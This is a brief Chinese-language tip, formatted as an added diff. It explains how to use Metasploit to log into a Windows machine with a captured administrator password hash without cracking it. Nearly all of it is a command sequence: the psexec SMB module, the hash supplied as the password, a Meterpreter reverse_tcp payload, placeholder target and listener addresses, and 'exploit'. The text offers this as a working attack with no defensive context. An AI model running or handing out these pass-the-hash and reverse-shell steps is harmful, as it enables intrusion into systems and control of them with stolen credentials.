@@ -1,0 +1,27 @@
+Metasploit使用hash直接登录系统
+抓到管理员的密码hash根本不用破解，直接就可以登录。use windows/smb/psexec
+
+
+
+set SMBUser username
+
+
+
+set SMBPass 用户密码的hash值
+
+
+
+set payload Windows/meterpreter/reverse_tcp
+
+
+
+set rhost 333.333.333.333
+
+
+
+set lhost 111.111.111.111
+
+
+
+exploit
+复制代码 
